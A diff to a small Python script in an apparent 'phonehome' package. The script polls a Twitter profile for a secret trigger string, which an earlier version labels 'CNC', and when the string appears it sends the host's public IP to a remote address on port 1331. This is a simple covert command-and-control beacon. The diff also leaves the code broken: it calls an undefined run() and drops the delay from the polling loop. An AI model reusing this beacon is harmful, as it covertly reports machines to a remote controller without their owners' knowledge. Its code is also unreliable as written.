@@ -1,6 +1,6 @@
 import requests
 import time
-from ip_tools import get_public_ip
+from phonehome.ip_tools import get_public_ip
 import socket
 
 def send_ip(dest_ip, port):
@@ -16,19 +16,21 @@ def check_url(link, secret):
 
     if secret in page.text:
         return True
+    else:
+        return False
 
-if __name__ == "__main__":
+def throw_bottle(secret, dest_ip):
     link =  "https://twitter.com/DylanMCromer"
     delay = 10
-    secret = "trying to get a paper ready"
-    ip = "127.0.0.1"
     port = 1331
 
     while True:
         if not check_url(link, secret):
-            print("CNC not active")
-            time.sleep(delay)
+            print("Flare not lit. Will not send the message in a bottle")
         else:
-            send_ip(ip, port)
+            send_ip(dest_ip, port)
             break
 
+
+if __name__ == "__main__":
+    run("KJHVJCYKUGJGFXCYUFTY")
